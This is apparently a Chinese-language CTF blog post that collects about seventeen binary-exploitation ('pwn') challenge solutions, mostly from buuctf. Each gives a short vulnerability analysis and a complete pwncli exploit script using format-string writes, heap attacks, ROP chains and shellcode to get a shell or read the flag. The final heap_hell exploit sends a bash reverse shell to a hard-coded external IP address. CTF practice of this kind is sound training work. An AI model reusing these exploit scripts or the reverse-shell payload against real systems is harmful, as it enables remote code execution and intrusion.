# buuctf-pwn-tasks-20



# 简介

有些题目很碎，直接搞一个合集吧，收录`20`个题目，大部分都是`buuctf`上面的，还有其他的题目。

<!-- more -->

## hitcon_2018_hackergame_2018_calc

这道题主要的考点在于使用`-0x80000000/-1`时也会触发异常。另外，有些软件和很多编程语言提供交互式的`shell`，比如`vi/vim/python/python3/python/nmap/irb/perl`。这里试了下，远程含有`vim`。

### EXP

```python
#!/usr/bin/python3
# -*- encoding: utf-8 -*-
# author: roderick
from pwncli import *

cli_script()

# trigger exception
sla(">>> ", "-2147483648/-1")
sla("Program crashed! You can run a program to examine:\n", 'vim')
sl(":!sh")

ia()
```

远程：

![image-20220308221732996](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20220308221732996.png)

## ciscn_2019_nw_6

一道关于`snprintf`的格式化字符串的题，输入在堆上，可借助`ebp`链完成利用。就当`printf`做即可。

### EXP

```python
#!/usr/bin/python3
# -*- encoding: utf-8 -*-
# author: roderick
from pwncli import *

cli_script()

io: tube = gift['io']
libc: ELF = gift['libc']

if gift.remote:
    libc = ELF("/home/roderick/glibc-all-in-one/buuctf_libc/x86/libc-2.27.so")

data = "roderick"+"%p,"*20
sla("please input the key:\n", data)

m = rl().split(b",")
log_ex(f"{m}")

stack_addr = int16_ex(m[7])
libc_addr = int16_ex(m[16])
target_addr = stack_addr + 4

libc_base = libc_addr - libc.sym['__libc_start_main'] - 241
libc.address = libc_base

log_address("stack_addr", stack_addr)
log_address("libc_addr", libc_addr)
log_libc_base_addr(libc_base)

data = "%{}c%24$hn".format(target_addr & 0xffff)
sla("please input the key:\n", data)

r()

data = "%{}c%61$hn".format(libc.sym.gets & 0xffff)
sla("please input the key:\n", data)
r()

data = "%{}c%24$hn".format((target_addr+2) & 0xffff)
sla("please input the key:\n", data)
r()

data = "%{}c%61$hn".format((libc.sym.gets >> 16) & 0xffff)
sla("please input the key:\n", data)
r()

target_addr += 8
data = "%{}c%24$hn".format((target_addr) & 0xffff)
sla("please input the key:\n", data)
r()

data = "%{}c%61$hn".format(stack_addr & 0xffff)
sla("please input the key:\n", data)
r()

sla("please input the key:\n", "hello")
r()
#
sl(b"a"*8+p32(stack_addr+0x20)+b"\x90"*0x30+ShellcodeMall.i386.cat_flag)

ia()
```

远程：

![image-20220308221900564](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20220308221900564.png)



## picoctf_2018_gps

`ret2shellcode`

### EXP

```python
#!/usr/bin/python3
# -*- encoding: utf-8 -*-
# author: roderick
from pwncli import *

cli_script()

m = rls("Current position:")
log_ex(f"get msg: {m}")

stack_addr = int16_ex(m[-14:])
log_address("stack_addr", stack_addr)

sla("What's your plan?\n> ", b"\x90"*0x800 + ShellcodeMall.amd64.cat_flag)

sla("Where do we start?\n> ", hex(stack_addr+0x400))

ia()
```

远程打：

![image-20220308223356725](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20220308223356725.png)



## rootersctf_2019_xsh

本质上是一个格式化字符串的题

### 漏洞点

![image-20220308223727650](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20220308223727650.png)





### EXP

```python
#!/usr/bin/python3
# -*- encoding: utf-8 -*-
# author: roderick
from pwncli import *

cli_script()

io: tube = gift['io']
elf: ELF = gift['elf']

sla("$ ", "echo xxx%p")

ru("xxx")
m = rl()
code_base = int16_ex(m) - 0x23ae
log_libc_base_addr(code_base)
elf.address = code_base

sla("$ ", b"echo xxx" + fmtstr_payload(offset=25, writes={elf.got.strncmp : elf.sym.system}, numbwritten=3, write_size="short", write_size_max="short"))

sla("$ ", "/bin/bash")

sl("cat flag")

ia()
```

远程打：

![image-20220308224456751](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20220308224456751.png)



## redhat_2019_three

观察执行`shellcode`时的寄存器值，巧妙地利用`xchg esp, ecx;ret`进行`rop`。

### 漏洞点

可以写`3`个字节的`shellcode`。

![image-20220308224842511](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20220308224842511.png)

那么可以在`call eax`的时候断住看看寄存器状态：

![image-20220308225613527](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20220308225613527.png)

`ECX`正好是`0x80f6cc0`，那么可以直接交换`esp`和`ecx`后进行`rop`。

正好`3`个字节，满足要求。

![image-20220308225935478](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20220308225935478.png)

### EXP

```python
#!/usr/bin/python3
# -*- encoding: utf-8 -*-
# author: roderick
from pwncli import *

cli_script()

sla("Give me a index:\n", "0")
sa("Three is good number,I like it very much!\n", "\x87\xcc\xc3")
sla("Leave you name of size:\n", str(0x200))
# ROPgadget --binary ./redhat_2019_three --ropchain
from struct import pack
# Padding goes here
p = b''
p += pack('<I', 0x08072f8b) # pop edx ; ret
p += pack('<I', 0x080f5000) # @ .data
p += pack('<I', 0x080c11e6) # pop eax ; ret
p += b'/bin'
p += pack('<I', 0x080573e5) # mov dword ptr [edx], eax ; ret
p += pack('<I', 0x08072f8b) # pop edx ; ret
p += pack('<I', 0x080f5004) # @ .data + 4
p += pack('<I', 0x080c11e6) # pop eax ; ret
p += b'//sh'
p += pack('<I', 0x080573e5) # mov dword ptr [edx], eax ; ret
p += pack('<I', 0x08072f8b) # pop edx ; ret
p += pack('<I', 0x080f5008) # @ .data + 8
p += pack('<I', 0x080569a0) # xor eax, eax ; ret
p += pack('<I', 0x080573e5) # mov dword ptr [edx], eax ; ret
p += pack('<I', 0x080481d9) # pop ebx ; ret
p += pack('<I', 0x080f5000) # @ .data
p += pack('<I', 0x08072fb2) # pop ecx ; pop ebx ; ret
p += pack('<I', 0x080f5008) # @ .data + 8
p += pack('<I', 0x080f5000) # padding without overwrite ebx
p += pack('<I', 0x08072f8b) # pop edx ; ret
p += pack('<I', 0x080f5008) # @ .data + 8
p += pack('<I', 0x080569a0) # xor eax, eax ; ret
p += pack('<I', 0x0808041a) # inc eax ; ret
p += pack('<I', 0x0808041a) # inc eax ; ret
p += pack('<I', 0x0808041a) # inc eax ; ret
p += pack('<I', 0x0808041a) # inc eax ; ret
p += pack('<I', 0x0808041a) # inc eax ; ret
p += pack('<I', 0x0808041a) # inc eax ; ret
p += pack('<I', 0x0808041a) # inc eax ; ret
p += pack('<I', 0x0808041a) # inc eax ; ret
p += pack('<I', 0x0808041a) # inc eax ; ret
p += pack('<I', 0x0808041a) # inc eax ; ret
p += pack('<I', 0x0808041a) # inc eax ; ret
p += pack('<I', 0x08049903) # int 0x80
sa("Tell me:\n", p)
ia()
```

远程打：

![image-20220308230141814](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20220308230141814.png)





## zer0pts_2020_protrude

不得不说，这个`gadget`：`add dword ptr [rbp - 0x3d], ebx ; nop dword ptr [rax + rax] ; ret`确实是`yyds`。

### checksec

![image-20220308235343962](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20220308235343962.png)

远程为`libc-2.23.so`。

### 漏洞点

![image-20220308235434524](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20220308235434524.png)

这里的`rax`实际上小于`8 * n`，所以会有栈溢出。当输入`n=20`或者`n=22`的时候，都会有溢出，恰好能溢出`rbp`和`ret`。

还有就是，循环变量在`rbp-0x30`，`rsp`在`rbp-0x20`。也就是说，在输入数字的过程中，可以修改这两个变量。



### 利用思路

可以修改`index`或者指针，也就可以让任意地址写任意值。

首先说思路一：改`index`，越过`canary`修改`ret`。但是由于只能改到`ret`，且程序没有循环，所以这里可以再一次执行`_start`函数，两次修改除了`canary`和指针地址外，其他值都刷为`0`，那么利用两次的和可以计算出一个差值，这个差值就是一个栈地址。紧接着第三次执行`main`函数，即可修改`rbp`和`ret`用栈迁移做`rop`。

不过这个思路写起来麻烦，我也懒得算，所以我选择改指针。

思路二：需改指针为`got`表上方地址，接着下一次修改`printf@got`为`pop rdi; ret`的地址，然后，你就会发现，之前输入的数可以直接拿来`rop`。借助`magic gadget`将`atol@got`修改为`system`，执行一次`read_long`输入`/bin/sh`即可拿到`shell`。

简要分析一下思路二，在`0x40090`地址处有一个`call printf`，我们知道，`call xxx`的本质是`push ip; jmp xxx`。`0x4008d5`有个`mov rax, rsp`，可知，此时的`rsp`就是我们输入第一个数的地址。所以，如果把`printf@got`修改为`pr`，那么就会把原来`push`到栈上的地址弹到寄存器，然后将输入的第一个数作为地址进行跳转执行，也就可以`rop`。当输入`n=20`的时候，前面可以输入`12`个数，用来`rop`绰绰有余。

修改`printf@got`：

![image-20220309001349896](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20220309001349896.png)

执行`call printf`：

![image-20220309001521834](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20220309001521834.png)

修改`atol@got`：

![image-20220309001631498](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20220309001631498.png)

### EXP

```python
#!/usr/bin/python3
# -*- encoding: utf-8 -*-
# author: roderick
from pwncli import *

cli_script()
elf: ELF = gift['elf']

sla("n = ", "20")

# 0x00000000004007a8: add dword ptr [rbp - 0x3d], ebx ; nop dword ptr [rax + rax] ; ret 
# 0x0000000000400a7a: pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; ret;

pl = [
    0x0000000000400a7a,
    0xe4f0,
    elf.got.atol+0x3d,
    0, 0, 0, 0,
    0x00000000004007a8,
    elf.sym.read_long
]

for i in range(12-len(pl)):
    pl.append(0)

for i in pl:
    r()
    sl(str(i))

r()
sl(str(0xd))
r()
sl(str(elf.got.printf - 8 * 0xf))

r()
sl(str(0x0000000000400a82)) # 0x0000000000400a82: pop r15; ret;

sl("/bin/bash")

sl("cat /flag")

ia()
```

远程打：

![image-20220308235041482](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20220308235041482.png)





## jarvisoj_xwork

静态链接程序，版本很低，方法很多。

### checksec

![image-20220312130919259](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20220312130919259.png)

### 漏洞点

`double free`:

![image-20220312130949265](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20220312130949265.png)

### 利用思路

版本很低，推测是`2.23`，思路如下：

- 泄露堆地址
- 使用`fastbin attack`构造`unsortedbin`，并执行`unsortedbin attack`
- 修改`top_chunk`指针指向数据段，修复`unsortedbin list`
- 利用类似`house of force`的思路，使得堆分配到数据段
- 修改指针，泄露栈地址
- 利用`leave;ret`迁移栈到数据段执行

### EXP

```
#!/usr/bin/python3
# -*- encoding: utf-8 -*-
# author: roderick
from pwncli import *

cli_script()

io: tube = gift['io']
elf: ELF = gift['elf']



def add(data="dedbeef"):
    sla("5.Exit\n", "1")
    s(data)

def show(idx):
    sla("5.Exit\n", "2")
    sla("Input the order index:", str(idx))
    return rn(0x18)

def edit(idx, data):
    sla("5.Exit\n", "3")
    sla("Input the order index:", str(idx))
    s(data)


def dele(idx):
    sla("5.Exit\n", "4")
    sla("Input the order index:", str(idx))


sla("What's your name:", "roderick")

for i in range(5):
    add()

dele(1)
dele(0)

m = show(0)
heap_addr = u64_ex(m[:8])
log_address("heap_addr", heap_addr)

edit(0, p64(heap_addr-0x10)+p64(0)*2+p32(0x31))

add(p64(0)*3+p32(0x31))
add(p64(0)+p64(0x91))

# get unsorted bin chunk
dele(1)

# unsorted bin attack
edit(6, p64(0)+p64(0x31)+p64(0)+p32(0x6CCD60-0x10))

add()

edit(0, p64(0x6ccd60)+p64(0)+p64(0x6ca858)+p32(0x6ca858))

add(p64(0x6ccd60)+p64(0x6ccd60+0x40)+p64(0x6ccd60+0x20)+p32(0x6c9f80))

m = show(5)
stack_addr = u64_ex(m[:8])
log_address("stack_addr", stack_addr)

target_addr = stack_addr - 0x3a1 -8

if gift.remote:
    target_addr = stack_addr - 0x349

edit(2, p64(target_addr) + b"/bin/sh\x00"+p64(0x00000000004789a6) + p32(0x3b))
edit(4, p64(0)+p64(0)+p64(0x00000000004019c7)+p32(0x6ccd98))
edit(7, p64(0) + p64(0x00000000004018a6)+p64(0x6ccd68)+p32(0x00000000004003da))

edit(0, p64(0x6ccd68) + p64(0x0000000000400a12))

sleep(0.3)
sl("cat /flag")
# mprotect sub_474D10
# 0x00000000004019c7: pop rsi; ret;
# 0x00000000004789a6: pop rax; pop rdx; pop rbx; ret; 
# 0x00000000004018a6: pop rdi; ret;
# 0x00000000004003da: syscall; 
# 0x6c9f80 stack addr
# 0x0000000000400a12: leave; ret; 

ia()
```

远程打：

![image-20220312152554705](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20220312152554705.png)

## pwnable_loveletter

不得不说，`pwnable`的题目都非常地因垂丝汀。

### checksec

![image-20220320165519663](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20220320165519663.png)

静态链接的程序。

### 漏洞点

出现`protect`函数：

![image-20220320165557025](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20220320165557025.png)

会将存在于输入字符串中的敏感字符替换为一个爱心。但是在替换的时候，字符串的长度会一直增大，且没有考虑到输入是储存在栈上的，因此，会造成栈溢出。

### 利用思路

尽管存在溢出，但是并不能直接利用。因为栈溢出需要绕过`canary`，但是此处没有办法泄露出`canary`的值。因此，直接`rop`是很困难的。存在栈溢出的时候，可以观察还有哪些变量会被覆盖掉，以及被覆盖的变量有没有参与到后续的代码中。发现在

![image-20220320165945100](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20220320165945100.png)

这三个长度都可以控制。由于最后的`command`是一段一段拼接的，可以直接控制第一段，是一个`echo xxx`。

那么，如何通过修改`echo`去执行系统命令呢，答案就是可以只用`e`这一个字母去拼凑命令。目前可以利用的命令至少有：`env`和`ed`

```bash
# 使用env
env sh -c bash
# 使用ed
ed ! 
!sh
```

不难写出`exp`。

### EXP

```python
#!/usr/bin/python3
# -*- encoding: utf-8 -*-
# author: roderick
from pwncli import *

cli_script()

io: tube = gift['io']
elf: ELF = gift['elf']
libc: ELF = gift['libc']

# get shell by 
# p = "nv sh -c bash "
p = "d ! "
sa("is : ", p + ";" + "a"*(0x100-3-len(p))+"\x01\n")

sleep(4)
sl("!sh")
sleep(1)
sl("cat /flag")

ia()
```

远程打：

![image-20220320170714941](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20220320170714941.png)

## x_nuca_2018_revenge

这题难就难在找`gadget`，拿`shell`的姿势是真的风骚。

题目是静态链接，直接在数据段上溢出，可以覆盖到后面的数据。

思路和`house of husk`类似，利用`printf`的那几个函数指针`table`完成利用。

思路：

首先控制`rax`：

![image-20220320170928549](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20220320170928549.png)

![image-20220320170959874](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20220320170959874.png)

然后这里设为：`xchg esp, eax ; ret`即可

### EXP

```python
#!/usr/bin/python3
# -*- encoding: utf-8 -*-
# author: roderick
from pwncli import *

cli_script()

io: tube = gift['io']
elf: ELF = gift['elf']


name_addr = elf.sym.name

"""
__printf_va_arg_table 0x6d0
__printf_function_table 0x648
__printf_arginfo_table 0x6c8
__printf_modifier_table 0x650
"""

payload = flat({
    0:[
        0x435459, # pop rdx, pop rsi; ret
        0,
        0,
        0x400525, # pop rdi; ret
        0x6b73e0+0x100,
        0x43364c, # pop rax; ret
        0x3b,
        0x400368 # syscall
    ],
    0x100: "/bin/sh\x00",
    0x390: [0x46d935] * 0x20,
    0x650: 0,
    0x6c8: 0x6b73e0,
    elf.sym['_dl_scope_free_list']-0x6b73e0: 0x6b73e0,
    elf.sym['_dl_wait_lookup_done']-0x6b73e0: 0x4a1a79 # xchg esp, eax; ret
})

sl(payload)

ia()
```

远程打：

![image-20220320171752143](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20220320171752143.png)





## csaw2018_shell_code

基础的`shellcode`题。编写下面这段发送过去即可。

![image-20220320172911848](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20220320172911848.png)

### EXP

```python
#!/usr/bin/python3
# -*- encoding: utf-8 -*-
# author: roderick
from pwncli import *

cli_script()

io: tube = gift['io']
elf: ELF = gift['elf']
libc: ELF = gift['libc']

payload = b"\x31\xff\x31\xc0\x31\xd2\xb6\xf0\x0f\x05\xff\xe6"

shellcode = disasm(payload)
print(shellcode)

sla("(15 bytes) Text for node 1:  ", payload)
sla("(15 bytes) Text for node 2: ", payload)

ru("node.next: ")
m = rl()
stack_addr = int16_ex(m[:-1])
log_address_ex("stack_addr")

sla("What are your initials?", flat({
    11:stack_addr+8
}))
sleep(2)

s(b"\x90"*0x100 + ShellcodeMall.amd64.execve_bin_sh)

ia()
```



远程打：

![image-20220320172806364](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20220320172806364.png)



##  wdb_2018_4th_pwn2

### checksec

![image-20220320173755647](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20220320173755647.png)

`libc-2.23.so`。

### 漏洞点

在`0x2333`分支：

![image-20220320173945682](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20220320173945682.png)

当打开的文件数量超过`1024`的时候，会失败。这个时候会返回`-1`，之后的`read`函数不会执行，所以此时的`buf`为`\x00`。

### 利用思路

- 首先利用前面的递归函数，在栈上留下`canary`的值。

- 泄露出`canary`的值
- 打开`1021`次`/dev/urandom`，耗尽所有的文件句柄资源
- 再打开一次，猜测`secret`为`\x00`即可进入到栈溢出分支
- 栈溢出进行`rop`泄露出`flag`即可

### EXP

```python
#!/usr/bin/python3
# -*- encoding: utf-8 -*-
# author: roderick
from pwncli import *

cli_script()

io: tube = gift['io']
elf: ELF = gift['elf']
libc: ELF = gift['libc']


def vuln(data):
    sla("option:", "1")
    sa("once..\n", data)

def read_bss(data):
    sla("option:", "2")
    if isinstance(data, (list, tuple)):
        ch = "n" * (len(data) - 1) + "y"
    else:
        ch = "y"
        data = [data]
    for d, c in zip(data, ch):
        sa("bored...\n", d)
        sa("y/n\n", c)

def secret(data):
    sla("option:", "9011")
    sa("code:", data)

# leak canary
read_bss(["deadbeef"] * 10)
vuln("a"*0xa9)
ru("a"*0xa8)

canary = ((u64_ex(rn(8))) >> 8) << 8
log_address_ex("canary")

pop_rdi_ret = CurrentGadgets.pop_rdi_ret()
pop_rsi_r15_ret = CurrentGadgets.pop_rsi_r15_ret()

payload = flat({
    0: "/flag\x00",
    8: canary,
    0x18:[
        pop_rdi_ret, # pop rdi
        0x602080,
        pop_rsi_r15_ret, # pop rsi r15
        0, 0, 
        elf.plt.open,
        pop_rdi_ret, 0,
        pop_rsi_r15_ret, 0x602180, 0, 
        elf.plt.read,
        pop_rdi_ret, 
        0x602180,
        elf.plt.puts
    ]
})

read_bss(payload)

for i in range(1021):
    secret("\x00" * 8)
    if i % 0x100 == 0:
        log_ex(f"current fd: {i+3}")

secret("\x00" * 8)
ia()
```

远程打：

![image-20220320213703417](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20220320213703417.png)



## wdb_2018_final_pwn2

直接一个`ret`即可绕过。

### EXP

```python
#!/usr/bin/python3
# -*- encoding: utf-8 -*-
# author: roderick
from pwncli import *

cli_script()

io: tube = gift['io']
elf: ELF = gift['elf']
libc: ELF = gift['libc']

# CurrentGadgets.set_find_area(find_in_elf, find_in_libc)

data = flat({
    40: [   
        CurrentGadgets.ret(),
        CurrentGadgets.pop_rdi_ret(),
        CurrentGadgets.bin_sh(),
        elf.plt.system
    ]
})
sla("> ", data)

sl("cat /flag")

ia()
```



##  wdb_2020_1st_boom2

是一个虚拟机，分析完流程即可。

### EXP

```python
#!/usr/bin/python3
# -*- encoding: utf-8 -*-
# author: roderick

from pwncli import *

cli_script()

io: tube = gift['io']
elf: ELF = gift['elf']
libc: ELF = gift['libc']

data = flat([
    0x10,
    0x19, 
    0x19,
    0xd,
    0xd,
    0xd,
    0x1,
    0xe8,
    0x1a,
    0xd,
    0x9,
    0xd,
    1, 0x2d78b,
    0x19,
    0xb
])
sla("> ", data)

ia()
```



远程打：

![image-20220323221515490](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20220323221515490.png)



## jarvisoj_http

非常简单的题，只要指定特定的`User-Agent`，即可通过`back`字段执行任意命令。

### EXP

```python
#!/usr/bin/python3
# -*- encoding: utf-8 -*-
# author: roderick

from pwncli import *

cli_script()

data = "User-Agent: 2135GFTS\r\n"
data += "back: cat /flag\r\n"
data += "\r\n\r\n"

s(data)

ia()
```

![image-20220403111138695](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20220403111138695.png)



## Firehttpd

### checksec

![image-20220403145330028](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20220403145330028.png)

### 漏洞点

在`server_file`有格式化字符串的漏洞

![image-20220403145439751](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20220403145439751.png)



### 利用思路

- 泄露出栈地址
- 将文件路径的指针修改指向`www/../flag`即可

### EXP

```python
#!/usr/bin/python3
# -*- encoding: utf-8 -*-
# author: roderick

from pwncli import *

cli_script()

io: tube = gift['io']
elf: ELF = gift['elf']
libc: ELF = gift['libc']

data = b"GET / \r\n"
data += b"Referer: %269$p\r\n"
data += b"\r\n"

s(data)

m = rls("Referer: ")

rbp_value = int16_ex(m[-15:])
log_address_ex("rbp_value")

targ_addr = rbp_value - 0x1120
rsi_value = rbp_value - 0x10f0

write_bytes= ((rsi_value >> 8) & 0xff) + 0x1

io.close()

ip = gift.ip
port = gift.port

io = remote(ip, port)
gift.io = io

data = b"GET / \r\n"
data += b"Referer: "+ f"%{write_bytes-9}c%15$hhn".ljust(23, "a").encode() + p64_ex(targ_addr+1) + cyclic(184)+b"www/../flag\x00"
data += b"\r\n\r\n"

s(data)

print(ra())

io.close()
```





![image-20220403145405787](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20220403145405787.png)





## pwnable_bookwriter

两种方法，围绕着`top_chunk`做文章。

### checksec

![image-20220403153138935](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20220403153138935.png)

远程环境`libc-2.23.so`。

### 漏洞点

在`add`分支，溢出：

![image-20220403152817884](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20220403152817884.png)



在`edit`分支：

![image-20220403152915223](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20220403152915223.png)

存在溢出修改下一个`chunk`的`size`域

### 利用思路

都写在`exp`里面了

### EXP

```python
#!/usr/bin/python3
# -*- encoding: utf-8 -*-
# author: roderick

from pwncli import *

cli_script()

io: tube = gift['io']
elf: ELF = gift['elf']
libc: ELF = gift['libc']


def add(size, data, attack=False):
    sla("Your choice :", "1")
    sla("Size of page :", str(size))
    if attack:
        return
    sa("Content :", data)

def view(idx):
    sla("Your choice :", "2")
    sla("Index of page :", str(idx))
    ru("Content :\n")
    m = rl()
    return m

def edit(idx, data):
    sla("Your choice :", "3")
    sla("Index of page :", str(idx))
    sa("Content:", data)

sla("Author :", flat({
    0: [
        0, 0x111, # fake chunk
        0, 0x6020a0
        ]
}))

def exp1():
    """
    1. 溢出修改top_chunk的size为很大的值，避免其扩容
    2. 分配大的chunk，使得top_chunk的size为0x1yyy
    3. 再次溢出，修改top_chunk的size为0xyyy，比原来少了0x1000
    4. 分配大的chunk，使top_chunk被释放掉，得到unsortedbin chunk
    5. 修改这个unsortedbin chunk的size为0x1zzz，这个大小需要覆盖新的top_chunk
    6. 分配走这个unsortedbin chunk，此时可以泄露地址
    7. 修改新的top_chunk的size，分配大chunk并再次得到一个unsortedbin chunk
    8. 上一个chunk可以覆写此时的unsortedbin chunk
    9. 伪造unsortedbin chunk链，任意地址分配
    """
    add(0x18, "a"*0x18)
    edit(0, "a"*0x18)
    edit(0, b"a"*0x18 + p32(0x40fe1)[:3])
    add(0x1fe00, "deadbeef")
    add(0x18, "a"*0x18) # 2

    edit(2, "a"*0x18)
    edit(2, b"a"*0x18 + p32(0x1b1)[:3])

    add(0x208, "deadbeef") # 3
    add(0x18, "a"*8) # 4
    m = view(4)
    libc_base = u64_ex(m[8:-1]) - 0x3c4cf8
    log_libc_base_addr(libc_base)
    libc.address = libc_base

    edit(4, "a"*0x18)
    edit(4, b"a"*0x18 + p16(0x13f1))
    edit(3, "a"*0x208)
    edit(3, b"a"*0x208 + p32(0xdf1)[:3])
    
    add(0x13e0, "deadbeef")
    
    add(0x1000, "deadbeef") # 6

    edit(5, flat({
        0x1390: [
            0, 0xdd1,
            0, 0x602060
        ]
    }))

    add(0x100, flat({
        0: "/bin/sh\x00",
        0x30: libc.sym.__malloc_hook,
        0x38: 0
    })) # 7

    edit(0, p64_ex(libc.sym.system))
    add(str(0x602070), 0, 1)
    ia()


def exp2():
    """
    1. 溢出修改top_chunk，得到unsortedbin chunk
    2. 分配满9个
    3. 此时的book[0]的大小，恰好是第8个的地址，可以溢出写
    4. 溢出修改unsortebin chunk链
    5. 同exp1的方法获取shell
    """
    add(0x18, "a"*0x18)
    edit(0, "a"*0x18)
    edit(0, b"a"*0x18 + p32(0xfe1)[:3])
    add(0x1110, "deadbeef")

    add(8, "a"*8)
    m = view(2)
    libc_base = u64_ex(m[8:-1]) - 0x3c5188
    log_libc_base_addr(libc_base)
    libc.address = libc_base

    edit(0, "\x00")
    for i in range(6):
        add(0x10, "deadbeef")
    
    edit(0, flat_z({
        0xf0: [
            0, 0xee1, 
            0, 0x602060
        ]
    }))

    add(0x100, flat({
        0: "/bin/sh\x00",
        0x30: libc.sym.__malloc_hook,
        0x38: 0
    })) # 7

    edit(0, p64_ex(libc.sym.system))
    add(str(0x602070), 0, 1)
    ia()

exp2()
```



![image-20220403153231900](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20220403153231900.png)



## inndy_echo3

### checksec

![image-20220403154220549](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20220403154220549.png)

远程为`libc-2.23.so`

### 漏洞点

格式化字符串漏洞：

![image-20220403173834345](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20220403173834345.png)

但是在这之前，栈的变化有随机性：

![image-20220403173933359](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20220403173933359.png)

当栈上存在很多地址的时候更好利用，所以这里根据一些特征去爆破一下。

### EXP

```python
#!/usr/bin/python3
# -*- encoding: utf-8 -*-
# author: roderick

from pwncli import *

cli_script()

io: tube = gift['io']
elf: ELF = gift['elf']
libc: ELF = gift['libc']


s("%14$p,%17$s,%43$p")
stack_data, libc_data, start_main_data = r().split(b",")

stack_addr = int16_ex(stack_data)
libc_addr = u32_ex(libc_data[0xc:0x10])
start_main_addr = int16_ex(start_main_data)

log_address_ex("stack_addr")
log_address_ex("libc_addr")
log_address_ex("start_main_addr")

assert hex(start_main_addr).endswith('637'), "try again!"

set_current_libc_base_and_log(libc_addr, 'setbuf')

s("%{}c%49$hn%4c%50$hndeadbeef\x00".format((stack_addr + 0x40) & 0xffff))
ru("deadbeef")

s("%20c%85$hhn%2c%87$hhndeadbeef\x00")
ru("deadbeef")

hi = libc.sym.system >> 16
lo = libc.sym.system & 0xffff

if lo > hi:
    s("%{}c%21$hn%{}c%20$hndeadbeef\x00".format(hi, lo - hi))
else:
    s("%{}c%20$hn%{}c%21$hndeadbeef\x00".format(lo, hi - lo))

ru("deadbeef")

s("/bin/bash\x00")

ia()
```

![image-20220403174437572](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20220403174437572.png)









## hack_lu_2018_heap_hell

### checksec

![image-20220403183504608](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20220403183504608.png)

远程`libc-2.23.so`。

### 漏洞点

在读取输入的时候，可以溢出：

![image-20220403183427437](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20220403183427437.png)

### 利用思路

- 伪造一个`unsorted bin chunk`，释放掉
- 泄露出`libc`地址
- 负数溢出，写`_IO_2_1_stdout_`结构体，伪造`vtable`，执行任意命令
- 关闭`socket`即可以使`fread`返回为`0`

### EXP

```python
#!/usr/bin/python3
# -*- encoding: utf-8 -*-
# author: roderick

from pwncli import *

cli_script()

io: tube = gift['io']
elf: ELF = gift['elf']
libc: ELF = gift['libc']


def write_heap(off, data, size=None):
    if size is None:
        size = len(data)
    sla("[4] : exit\n", "1")
    sla("How much do you want to write?\n", str(size))
    sla("At which offset?\n", str(off))
    s(data)


def free_heap(off):
    sla("[4] : exit\n", "2")
    sla("At which offset do you want to free?\n", str(off))

def view_heap(off):
    sla("[4] : exit\n", "3")
    sla("At which offset do you want to leak?\n", str(off))
    return rl()

mmap_addr = 0x10000
rls("Allocating your scratch pad")
sl(str(mmap_addr))


# leak addr
write_heap(0, flat_z({
    0: [0, 0x111],
    0x110: [
        0, 0x21,
        0, 0
    ] * 3
}))

free_heap(0x10)

m = view_heap(0x10)
libc_base = set_current_libc_base_and_log(u64_ex(m[:-1]), 0x3c4b78)

file_str = FileStructure()
file_str.vtable = libc.sym["_IO_2_1_stdout_"] + 0x10 + 0x20
file_str.chain = libc.sym['system']
file_str._lock = libc_base + 0x3c6780 # 这里指定一个lock地址即可

# 反弹shell可以成功
payload = b"/bin/bash -c \"bash -i > /dev/tcp/120.25.122.195/10001 0>&1 2>&1\"\x00".ljust(0x48, b"\x00")
payload += bytes(file_str)[0x48:]

write_heap(off=libc.sym._IO_2_1_stdout_ - mmap_addr, data=payload, size=mmap_addr + 0x10000 + 1)

io.shutdown("send")

ia()
```



反弹`shell`可以，直接`cat flag`没有输出，猜测和`pwntools`有关。



